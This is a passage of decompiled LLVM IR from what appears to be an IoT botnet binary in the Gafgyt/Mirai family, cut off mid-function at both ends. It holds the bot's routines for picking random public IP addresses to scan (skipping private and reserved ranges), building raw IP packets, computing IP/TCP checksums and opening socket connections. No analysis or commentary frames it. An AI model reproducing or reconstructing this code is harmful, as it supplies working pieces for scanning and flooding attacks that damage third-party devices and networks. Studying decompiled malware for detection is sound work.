  uselistorder i32 %v2_10002d68, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002c78, { 1, 0 }
  uselistorder i32 %v2_10002c48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002e98, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002e90, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002e84, { 1, 0 }
  uselistorder label %dec_label_pc_10002e4c.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  store i32 268447440, i32* @lr, align 4
  %v0_10002ecc = call i32 @random()
  %v2_10002eec = srem i32 %v0_10002ecc, 223
  %v1_10002f10 = trunc i32 %v2_10002eec to i8
  store i8 %v1_10002f10, i8* @global_var_10023530.47, align 1
  store i32 268447512, i32* @lr, align 4
  %v0_10002f14 = call i32 @random()
  %v2_10002f34 = srem i32 %v0_10002f14, 255
  %v1_10002f58 = trunc i32 %v2_10002f34 to i8
  store i8 %v1_10002f58, i8* @global_var_10023531.48, align 1
  store i32 268447584, i32* @lr, align 4
  %v0_10002f5c = call i32 @random()
  %v2_10002f7c = srem i32 %v0_10002f5c, 255
  %v1_10002fa0 = trunc i32 %v2_10002f7c to i8
  store i8 %v1_10002fa0, i8* @global_var_10023532.49, align 1
  store i32 268447656, i32* @lr, align 4
  %v0_10002fa4 = call i32 @random()
  %v2_10002fc4 = srem i32 %v0_10002fa4, 255
  %extract.t = trunc i32 %v2_10002fc4 to i8
  br label %dec_label_pc_10003110

dec_label_pc_10002ff0:                            ; preds = %dec_label_pc_100033a4, %dec_label_pc_10003390, %dec_label_pc_1000337c, %dec_label_pc_10003368, %dec_label_pc_10003354, %dec_label_pc_10003340, %dec_label_pc_1000332c, %dec_label_pc_10003318, %dec_label_pc_10003304, %dec_label_pc_100032f0, %dec_label_pc_100032dc, %dec_label_pc_100032c8, %dec_label_pc_100032b4, %dec_label_pc_100032a0, %dec_label_pc_1000328c, %dec_label_pc_10003250, %dec_label_pc_10003228, %dec_label_pc_100031ec, %dec_label_pc_100031b0, %dec_label_pc_10003188, %dec_label_pc_10003174, %dec_label_pc_10003160, %dec_label_pc_1000314c, %dec_label_pc_10003138, %dec_label_pc_10003124, %dec_label_pc_10003110
  store i32 268447732, i32* @lr, align 4
  %v0_10002ff0 = call i32 @random()
  %v2_10003010 = srem i32 %v0_10002ff0, 223
  %v1_10003034 = trunc i32 %v2_10003010 to i8
  store i8 %v1_10003034, i8* @global_var_10023530.47, align 1
  store i32 268447804, i32* @lr, align 4
  %v0_10003038 = call i32 @random()
  %v2_10003058 = srem i32 %v0_10003038, 255
  %v1_1000307c = trunc i32 %v2_10003058 to i8
  store i8 %v1_1000307c, i8* @global_var_10023531.48, align 1
  store i32 268447876, i32* @lr, align 4
  %v0_10003080 = call i32 @random()
  %v2_100030a0 = srem i32 %v0_10003080, 255
  %v1_100030c4 = trunc i32 %v2_100030a0 to i8
  store i8 %v1_100030c4, i8* @global_var_10023532.49, align 1
  store i32 268447948, i32* @lr, align 4
  %v0_100030c8 = call i32 @random()
  %v2_100030e8 = srem i32 %v0_100030c8, 255
  %extract.t32 = trunc i32 %v2_100030e8 to i8
  br label %dec_label_pc_10003110

dec_label_pc_10003110:                            ; preds = %entry, %dec_label_pc_10002ff0
  %storemerge.in.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t32, %dec_label_pc_10002ff0 ]
  store i8 %storemerge.in.off0, i8* @global_var_10023533.50, align 1
  %v3_10003114 = load i8, i8* @global_var_10023530.47, align 1
  %v4_10003114 = zext i8 %v3_10003114 to i32
  %v3_1000311c = icmp eq i8 %v3_10003114, 127
  br i1 %v3_1000311c, label %dec_label_pc_10002ff0, label %dec_label_pc_10003124

dec_label_pc_10003124:                            ; preds = %dec_label_pc_10003110
  %v3_10003130 = icmp eq i8 %v3_10003114, 0
  br i1 %v3_10003130, label %dec_label_pc_10002ff0, label %dec_label_pc_10003138

dec_label_pc_10003138:                            ; preds = %dec_label_pc_10003124
  %v3_10003144 = icmp eq i8 %v3_10003114, 3
  br i1 %v3_10003144, label %dec_label_pc_10002ff0, label %dec_label_pc_1000314c

dec_label_pc_1000314c:                            ; preds = %dec_label_pc_10003138
  %v3_10003158 = icmp eq i8 %v3_10003114, 15
  br i1 %v3_10003158, label %dec_label_pc_10002ff0, label %dec_label_pc_10003160

dec_label_pc_10003160:                            ; preds = %dec_label_pc_1000314c
  %v3_1000316c = icmp eq i8 %v3_10003114, 16
  br i1 %v3_1000316c, label %dec_label_pc_10002ff0, label %dec_label_pc_10003174

dec_label_pc_10003174:                            ; preds = %dec_label_pc_10003160
  %v3_10003180 = icmp eq i8 %v3_10003114, 56
  br i1 %v3_10003180, label %dec_label_pc_10002ff0, label %dec_label_pc_10003188

dec_label_pc_10003188:                            ; preds = %dec_label_pc_10003174
  %v3_10003194 = icmp eq i8 %v3_10003114, 10
  br i1 %v3_10003194, label %dec_label_pc_10002ff0, label %dec_label_pc_1000319c

dec_label_pc_1000319c:                            ; preds = %dec_label_pc_10003188
  %v3_100031a8 = icmp eq i8 %v3_10003114, -64
  br i1 %v3_100031a8, label %dec_label_pc_100031b0, label %dec_label_pc_100031c4

dec_label_pc_100031b0:                            ; preds = %dec_label_pc_1000319c
  %v3_100031b4 = load i8, i8* @global_var_10023531.48, align 1
  %v3_100031bc = icmp eq i8 %v3_100031b4, -88
  br i1 %v3_100031bc, label %dec_label_pc_10002ff0, label %dec_label_pc_100031c4

dec_label_pc_100031c4:                            ; preds = %dec_label_pc_1000319c, %dec_label_pc_100031b0
  %v3_100031d0 = icmp eq i8 %v3_10003114, -84
  br i1 %v3_100031d0, label %dec_label_pc_100031d8, label %dec_label_pc_10003200

dec_label_pc_100031d8:                            ; preds = %dec_label_pc_100031c4
  %v3_100031dc = load i8, i8* @global_var_10023531.48, align 1
  %tmp26 = icmp ult i8 %v3_100031dc, 16
  br i1 %tmp26, label %dec_label_pc_10003200, label %dec_label_pc_100031ec

dec_label_pc_100031ec:                            ; preds = %dec_label_pc_100031d8
  %tmp27 = icmp ult i8 %v3_100031dc, 32
  br i1 %tmp27, label %dec_label_pc_10002ff0, label %dec_label_pc_10003200

dec_label_pc_10003200:                            ; preds = %dec_label_pc_100031c4, %dec_label_pc_100031ec, %dec_label_pc_100031d8
  %v3_1000320c = icmp eq i8 %v3_10003114, 100
  br i1 %v3_1000320c, label %dec_label_pc_10003214, label %dec_label_pc_1000323c

dec_label_pc_10003214:                            ; preds = %dec_label_pc_10003200
  %v3_10003218 = load i8, i8* @global_var_10023531.48, align 1
  %tmp28 = icmp ult i8 %v3_10003218, 64
  br i1 %tmp28, label %dec_label_pc_1000323c, label %dec_label_pc_10003228

dec_label_pc_10003228:                            ; preds = %dec_label_pc_10003214
  %tmp29 = icmp ult i8 %v3_10003218, 127
  br i1 %tmp29, label %dec_label_pc_10002ff0, label %dec_label_pc_1000323c

dec_label_pc_1000323c:                            ; preds = %dec_label_pc_10003200, %dec_label_pc_10003228, %dec_label_pc_10003214
  %v3_10003248 = icmp eq i8 %v3_10003114, -87
  br i1 %v3_10003248, label %dec_label_pc_10003250, label %dec_label_pc_10003264

dec_label_pc_10003250:                            ; preds = %dec_label_pc_1000323c
  %v3_10003254 = load i8, i8* @global_var_10023531.48, align 1
  %v3_1000325c = icmp eq i8 %v3_10003254, -1
  br i1 %v3_1000325c, label %dec_label_pc_10002ff0, label %dec_label_pc_10003264

dec_label_pc_10003264:                            ; preds = %dec_label_pc_1000323c, %dec_label_pc_10003250
  %v3_10003270 = icmp eq i8 %v3_10003114, -58
  br i1 %v3_10003270, label %dec_label_pc_10003278, label %dec_label_pc_100032a0

dec_label_pc_10003278:                            ; preds = %dec_label_pc_10003264
  %v3_1000327c = load i8, i8* @global_var_10023531.48, align 1
  %tmp30 = icmp ult i8 %v3_1000327c, 18
  br i1 %tmp30, label %dec_label_pc_100032a0, label %dec_label_pc_1000328c

dec_label_pc_1000328c:                            ; preds = %dec_label_pc_10003278
  %tmp31 = icmp ult i8 %v3_1000327c, 20
  br i1 %tmp31, label %dec_label_pc_10002ff0, label %dec_label_pc_100032a0

dec_label_pc_100032a0:                            ; preds = %dec_label_pc_10003264, %dec_label_pc_1000328c, %dec_label_pc_10003278
  %v3_100032ac = icmp eq i8 %v3_10003114, -32
  br i1 %v3_100032ac, label %dec_label_pc_10002ff0, label %dec_label_pc_100032b4

dec_label_pc_100032b4:                            ; preds = %dec_label_pc_100032a0
  %v3_100032c0 = icmp eq i8 %v3_10003114, 6
  br i1 %v3_100032c0, label %dec_label_pc_10002ff0, label %dec_label_pc_100032c8

dec_label_pc_100032c8:                            ; preds = %dec_label_pc_100032b4
  %v3_100032d4 = icmp eq i8 %v3_10003114, 7
  br i1 %v3_100032d4, label %dec_label_pc_10002ff0, label %dec_label_pc_100032dc

dec_label_pc_100032dc:                            ; preds = %dec_label_pc_100032c8
  %v3_100032e8 = icmp eq i8 %v3_10003114, 11
  br i1 %v3_100032e8, label %dec_label_pc_10002ff0, label %dec_label_pc_100032f0

dec_label_pc_100032f0:                            ; preds = %dec_label_pc_100032dc
  %v3_100032fc = icmp eq i8 %v3_10003114, 21
  br i1 %v3_100032fc, label %dec_label_pc_10002ff0, label %dec_label_pc_10003304

dec_label_pc_10003304:                            ; preds = %dec_label_pc_100032f0
  %v3_10003310 = icmp eq i8 %v3_10003114, 22
  br i1 %v3_10003310, label %dec_label_pc_10002ff0, label %dec_label_pc_10003318

dec_label_pc_10003318:                            ; preds = %dec_label_pc_10003304
  %v3_10003324 = icmp eq i8 %v3_10003114, 26
  br i1 %v3_10003324, label %dec_label_pc_10002ff0, label %dec_label_pc_1000332c

dec_label_pc_1000332c:                            ; preds = %dec_label_pc_10003318
  %v3_10003338 = icmp eq i8 %v3_10003114, 28
  br i1 %v3_10003338, label %dec_label_pc_10002ff0, label %dec_label_pc_10003340

dec_label_pc_10003340:                            ; preds = %dec_label_pc_1000332c
  %v3_1000334c = icmp eq i8 %v3_10003114, 29
  br i1 %v3_1000334c, label %dec_label_pc_10002ff0, label %dec_label_pc_10003354

dec_label_pc_10003354:                            ; preds = %dec_label_pc_10003340
  %v3_10003360 = icmp eq i8 %v3_10003114, 30
  br i1 %v3_10003360, label %dec_label_pc_10002ff0, label %dec_label_pc_10003368

dec_label_pc_10003368:                            ; preds = %dec_label_pc_10003354
  %v3_10003374 = icmp eq i8 %v3_10003114, 33
  br i1 %v3_10003374, label %dec_label_pc_10002ff0, label %dec_label_pc_1000337c

dec_label_pc_1000337c:                            ; preds = %dec_label_pc_10003368
  %v3_10003388 = icmp eq i8 %v3_10003114, 55
  br i1 %v3_10003388, label %dec_label_pc_10002ff0, label %dec_label_pc_10003390

dec_label_pc_10003390:                            ; preds = %dec_label_pc_1000337c
  %v3_1000339c = icmp eq i8 %v3_10003114, -42
  br i1 %v3_1000339c, label %dec_label_pc_10002ff0, label %dec_label_pc_100033a4

dec_label_pc_100033a4:                            ; preds = %dec_label_pc_10003390
  %v3_100033b0 = icmp eq i8 %v3_10003114, -41
  br i1 %v3_100033b0, label %dec_label_pc_10002ff0, label %dec_label_pc_100033b8

dec_label_pc_100033b8:                            ; preds = %dec_label_pc_100033a4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_100033d8 = ptrtoint i32* %stack_var_-56 to i32
  %v4_10003438 = call i32 @szprintf(i32 %v2_100033d8, i32 ptrtoint ([12 x i8]* @global_var_1001106c.51 to i32), i32 %v4_10003114)
  store i32 268448840, i32* @lr, align 4
  %v1_10003444 = call i32 @inet_addr(i32 %v2_100033d8)
  ret i32 %v1_10003444

; uselistorder directives
  uselistorder i32 %v2_100033d8, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i8* @global_var_10023532.49, { 1, 0 }
  uselistorder i8* @global_var_10023531.48, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_10023530.47, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100032a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003264, { 1, 0 }
  uselistorder label %dec_label_pc_1000323c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003200, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100031c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003110, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10003484 = load i32, i32* @global_var_10023538.52, align 4
  store i32 %v3_10003484, i32* @r3, align 4
  %v2_1000348c = call i32 @ntohl(i32 %v3_10003484, i32 268566528)
  %v2_10003498 = and i32 %v2_1000348c, %arg1
  %v0_100034a0 = call i32 @rand_cmwc()
  %v1_100034ac = sub i32 -1, %arg1
  %v2_100034b0 = and i32 %v0_100034a0, %v1_100034ac
  %v2_100034b8 = xor i32 %v2_100034b0, %v2_10003498
  ret i32 %v2_100034b8
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100035483 = icmp sgt i32 %arg2, 1
  br i1 %v2_100035483, label %dec_label_pc_10003500, label %dec_label_pc_10003550

dec_label_pc_10003500:                            ; preds = %entry, %dec_label_pc_10003500
  %stack_var_-24.08 = phi i16* [ %v5_10003534, %dec_label_pc_10003500 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_1000353c, %dec_label_pc_10003500 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_10003520, %dec_label_pc_10003500 ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_1000351c, %dec_label_pc_10003500 ], [ 0, %entry ]
  %v4_10003500 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_10003504 = load i16, i16* %stack_var_-24.08, align 2
  %v3_10003504 = zext i16 %v2_10003504 to i32
  %v2_1000351c = add i32 %v3_10003504, %stack_var_-12.05
  %v3_1000351c = icmp ult i32 %v2_1000351c, %stack_var_-12.05
  %v4_10003520 = zext i1 %v3_1000351c to i32
  %v5_10003520 = add i32 %v4_10003520, %stack_var_-16.06
  %v1_10003530 = add i32 %v4_10003500, 2
  %v5_10003534 = inttoptr i32 %v1_10003530 to i16*
  %v1_1000353c = add nsw i32 %stack_var_-20.07, -2
  %v2_10003548 = icmp sgt i32 %v1_1000353c, 1
  br i1 %v2_10003548, label %dec_label_pc_10003500, label %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge

dec_label_pc_10003544.dec_label_pc_10003550_crit_edge: ; preds = %dec_label_pc_10003500
  %v3_10003548.le = icmp eq i32 %v1_1000353c, 1
  br i1 %v3_10003548.le, label %dec_label_pc_1000355c, label %dec_label_pc_100035c8.preheader

dec_label_pc_10003550:                            ; preds = %entry
  %v3_100035484 = icmp eq i32 %arg2, 1
  br i1 %v3_100035484, label %dec_label_pc_1000355c, label %dec_label_pc_100035c8.preheader

dec_label_pc_1000355c:                            ; preds = %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge, %dec_label_pc_10003550
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_10003534, %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge ], [ %arg1, %dec_label_pc_10003550 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_10003520, %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge ], [ 0, %dec_label_pc_10003550 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_1000351c, %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge ], [ 0, %dec_label_pc_10003550 ]
  %v1_10003560 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_10003560 = load i8, i8* %v1_10003560, align 1
  %v3_10003560 = zext i8 %v2_10003560 to i32
  %v2_10003578 = add i32 %v3_10003560, %stack_var_-12.0.lcssa18
  %v3_10003578 = icmp ult i32 %v2_10003578, %stack_var_-12.0.lcssa18
  %v4_1000357c = zext i1 %v3_10003578 to i32
  %v5_1000357c = add i32 %v4_1000357c, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_100035c8.preheader

dec_label_pc_100035c8.preheader:                  ; preds = %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge, %dec_label_pc_1000355c, %dec_label_pc_10003550
  %stack_var_-12.1.ph = phi i32 [ %v2_1000351c, %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge ], [ 0, %dec_label_pc_10003550 ], [ %v2_10003578, %dec_label_pc_1000355c ]
  %stack_var_-16.1.ph = phi i32 [ %v5_10003520, %dec_label_pc_10003544.dec_label_pc_10003550_crit_edge ], [ 0, %dec_label_pc_10003550 ], [ %v5_1000357c, %dec_label_pc_1000355c ]
  %v1_100035cc29 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_100035d430 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100035d831 = or i32 %v1_100035cc29, %v1_100035d430
  %v1_100035e032 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_100035e833 = or i32 %v2_100035d831, %v1_100035e032
  %v3_100035ec34 = icmp eq i32 %v2_100035e833, 0
  br i1 %v3_100035ec34, label %dec_label_pc_100035f4, label %dec_label_pc_1000358c

dec_label_pc_1000358c:                            ; preds = %dec_label_pc_100035c8.preheader, %dec_label_pc_1000358c
  %v1_100035e037 = phi i32 [ %v1_100035e0, %dec_label_pc_1000358c ], [ %v1_100035e032, %dec_label_pc_100035c8.preheader ]
  %v2_100035d836 = phi i32 [ %v2_100035d8, %dec_label_pc_1000358c ], [ %v2_100035d831, %dec_label_pc_100035c8.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_100035b8, %dec_label_pc_1000358c ], [ %stack_var_-12.1.ph, %dec_label_pc_100035c8.preheader ]
  %v1_10003598 = urem i32 %stack_var_-12.135, 65536
  %v2_100035b8 = add i32 %v2_100035d836, %v1_10003598
  %v3_100035b8 = icmp ult i32 %v2_100035b8, %v1_10003598
  %v4_100035bc = zext i1 %v3_100035b8 to i32
  %v5_100035bc = add nuw nsw i32 %v4_100035bc, %v1_100035e037
  %v1_100035cc = mul i32 %v5_100035bc, 65536
  %v1_100035d4 = udiv i32 %v2_100035b8, 65536
  %v2_100035d8 = or i32 %v1_100035cc, %v1_100035d4
  %v1_100035e0 = udiv i32 %v5_100035bc, 65536
  %v2_100035e8 = or i32 %v2_100035d8, %v1_100035e0
  %v3_100035ec = icmp eq i32 %v2_100035e8, 0
  br i1 %v3_100035ec, label %dec_label_pc_100035c8.dec_label_pc_100035f4_crit_edge, label %dec_label_pc_1000358c

dec_label_pc_100035c8.dec_label_pc_100035f4_crit_edge: ; preds = %dec_label_pc_1000358c
  br label %dec_label_pc_100035f4

dec_label_pc_100035f4:                            ; preds = %dec_label_pc_100035c8.dec_label_pc_100035f4_crit_edge, %dec_label_pc_100035c8.preheader
  %v4_100035f4 = zext i16 %tmp21 to i32
  %v1_10003600 = xor i32 %v4_100035f4, 65535
  ret i32 %v1_10003600

; uselistorder directives
  uselistorder i32 %v2_100035d8, { 1, 0 }
  uselistorder i32 %v5_100035bc, { 1, 0 }
  uselistorder i32 %v2_100035b8, { 0, 2, 1 }
  uselistorder i32 %v1_100035e032, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_1000353c, { 0, 2, 1 }
  uselistorder i32 %v2_1000351c, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000358c, { 1, 0 }
  uselistorder label %dec_label_pc_100035c8.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000355c, { 1, 0 }
  uselistorder label %dec_label_pc_10003500, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003618 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003618, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10003644 = add i32 %arg1, 12
  %v2_10003644 = inttoptr i32 %v1_10003644 to i32*
  %v3_10003644 = load i32, i32* %v2_10003644, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10003650 = add i32 %arg1, 16
  %v2_10003650 = inttoptr i32 %v1_10003650 to i32*
  %v3_10003650 = load i32, i32* %v2_10003650, align 4
  store i32 20, i32* @r3, align 4
  %v1_1000366c = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268449420, i32* @lr, align 4
  %v0_10003688 = call i32 @malloc()
  store i32 %v0_10003688, i32* %r11.global-to-local, align 4
  store i32 %v3_10003650, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100036a8 = inttoptr i32 %v0_10003688 to i32*
  store i32 %v3_10003644, i32* %v2_100036a8, align 4
  %v0_100036ac = load i32, i32* %r10.global-to-local, align 4
  %v1_100036ac = load i32, i32* %r11.global-to-local, align 4
  %v2_100036ac = add i32 %v1_100036ac, 4
  %v3_100036ac = inttoptr i32 %v2_100036ac to i32*
  store i32 %v0_100036ac, i32* %v3_100036ac, align 4
  %v0_100036b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100036b0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036b0 = add i32 %v1_100036b0, 8
  %v3_100036b0 = inttoptr i32 %v2_100036b0 to i32*
  store i32 %v0_100036b0, i32* %v3_100036b0, align 4
  %v1_100036b8 = add i32 %v0_10003688, 12
  store i32 %v1_100036b8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100036c0 = load i32, i32* %arg2, align 4
  %v1_100036c4 = add i32 %tmp, 4
  %v2_100036c4 = inttoptr i32 %v1_100036c4 to i32*
  %v3_100036c4 = load i32, i32* %v2_100036c4, align 4
  store i32 %v3_100036c4, i32* %r10.global-to-local, align 4
  %v1_100036c8 = add i32 %tmp, 8
  %v2_100036c8 = inttoptr i32 %v1_100036c8 to i32*
  %v3_100036c8 = load i32, i32* %v2_100036c8, align 4
  %v1_100036cc = add i32 %tmp, 12
  %v2_100036cc = inttoptr i32 %v1_100036cc to i32*
  %v3_100036cc = load i32, i32* %v2_100036cc, align 4
  %v2_100036d0 = inttoptr i32 %v1_100036b8 to i32*
  store i32 %v2_100036c0, i32* %v2_100036d0, align 4
  %v0_100036d4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100036d4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036d4 = add i32 %v1_100036d4, 4
  %v3_100036d4 = inttoptr i32 %v2_100036d4 to i32*
  store i32 %v0_100036d4, i32* %v3_100036d4, align 4
  %v1_100036d8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036d8 = add i32 %v1_100036d8, 8
  %v3_100036d8 = inttoptr i32 %v2_100036d8 to i32*
  store i32 %v3_100036c8, i32* %v3_100036d8, align 4
  %v1_100036dc = load i32, i32* %r11.global-to-local, align 4
  %v2_100036dc = add i32 %v1_100036dc, 12
  %v3_100036dc = inttoptr i32 %v2_100036dc to i32*
  store i32 %v3_100036cc, i32* %v3_100036dc, align 4
  %v1_100036e0 = add i32 %tmp, 16
  %v2_100036e0 = inttoptr i32 %v1_100036e0 to i32*
  %v3_100036e0 = load i32, i32* %v2_100036e0, align 4
  %v1_100036e4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036e4 = add i32 %v1_100036e4, 16
  %v3_100036e4 = inttoptr i32 %v2_100036e4 to i32*
  store i32 %v3_100036e0, i32* %v3_100036e4, align 4
  %v5_100036f0 = inttoptr i32 %v0_10003688 to i16*
  %v6_100036f0 = call i32 @csum(i16* %v5_100036f0, i32 32, i32 %v3_100036cc, i32 %v3_100036c8, i32 %tmp)
  %sext = mul i32 %v6_100036f0, 65536
  %v1_100036f4 = sdiv i32 %sext, 65536
  store i32 %v0_10003688, i32* @r3, align 4
  store i32 268449540, i32* @lr, align 4
  %v0_10003700 = call i32 @free()
  %v1_10003708 = urem i32 %v1_100036f4, 65536
  %v2_10003710 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10003710, i32* %r11.global-to-local, align 4
  ret i32 %v1_10003708

; uselistorder directives
  uselistorder i32 %v0_10003688, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10003760 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10003760, i32* %arg1, align 4
  %v1_10003774 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003774, i32* %arg1, align 4
  %v3_10003784 = add i32 %tmp1, 1
  %v4_10003784 = inttoptr i32 %v3_10003784 to i8*
  store i8 0, i8* %v4_10003784, align 1
  %fold = add i32 %arg5, 20
  %v1_1000379c = trunc i32 %fold to i16
  %v3_1000379c = add i32 %tmp1, 2
  %v4_1000379c = inttoptr i32 %v3_1000379c to i16*
  store i16 %v1_1000379c, i16* %v4_1000379c, align 2
  %v0_100037a0 = call i32 @rand_cmwc()
  %v1_100037b0 = trunc i32 %v0_100037a0 to i16
  %v3_100037b0 = add i32 %tmp1, 4
  %v4_100037b0 = inttoptr i32 %v3_100037b0 to i16*
  store i16 %v1_100037b0, i16* %v4_100037b0, align 2
  %v3_100037bc = add i32 %tmp1, 6
  %v4_100037bc = inttoptr i32 %v3_100037bc to i16*
  store i16 0, i16* %v4_100037bc, align 2
  %v3_100037c8 = add i32 %tmp1, 8
  %v4_100037c8 = inttoptr i32 %v3_100037c8 to i8*
  store i8 -1, i8* %v4_100037c8, align 1
  %v3_100037d4 = add i32 %tmp1, 9
  %v4_100037d4 = inttoptr i32 %v3_100037d4 to i8*
  store i8 %tmp, i8* %v4_100037d4, align 1
  %v3_100037e0 = add i32 %tmp1, 10
  %v4_100037e0 = inttoptr i32 %v3_100037e0 to i16*
  store i16 0, i16* %v4_100037e0, align 2
  %v2_100037ec = add i32 %tmp1, 12
  %v3_100037ec = inttoptr i32 %v2_100037ec to i32*
  store i32 %arg3, i32* %v3_100037ec, align 4
  %v2_100037f8 = add i32 %tmp1, 16
  %v3_100037f8 = inttoptr i32 %v2_100037f8 to i32*
  store i32 %arg2, i32* %v3_100037f8, align 4
  ret i32 %v0_100037a0
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10003830 = icmp sgt i32 %arg1, 2
  br i1 %v2_10003830, label %dec_label_pc_10003844, label %dec_label_pc_10003854

dec_label_pc_10003844:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000384c.53 to i32), i32* @lr, align 4
  %v1_10003848 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10003854

dec_label_pc_10003854:                            ; preds = %entry, %dec_label_pc_10003844
  %storemerge = phi i32 [ 0, %dec_label_pc_10003844 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10003854, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268449956, i32* @lr, align 4
  %v1_100038a0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_100038b0 = icmp eq i32 %v1_100038a0, 0
  br i1 %v3_100038b0, label %dec_label_pc_100038b8, label %dec_label_pc_100038c4

dec_label_pc_100038b8:                            ; preds = %entry
  br label %dec_label_pc_1000399c

dec_label_pc_100038c4:                            ; preds = %entry
  %v1_100038c8 = add i32 %v1_100038a0, 16
  %v2_100038c8 = inttoptr i32 %v1_100038c8 to i32*
  %v3_100038c8 = load i32, i32* %v2_100038c8, align 4
  %v1_100038cc = inttoptr i32 %v3_100038c8 to i32*
  %v2_100038cc = load i32, i32* %v1_100038cc, align 4
  %v1_100038d4 = add i32 %v1_100038a0, 12
  %v2_100038d4 = inttoptr i32 %v1_100038d4 to i32*
  %v3_100038d4 = load i32, i32* %v2_100038d4, align 4
  %v2_100038dc = ptrtoint i32* %stack_var_-48 to i32
  %v2_100038e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_100038d4, i32* @r5, align 4
  store i32 268450036, i32* @lr, align 4
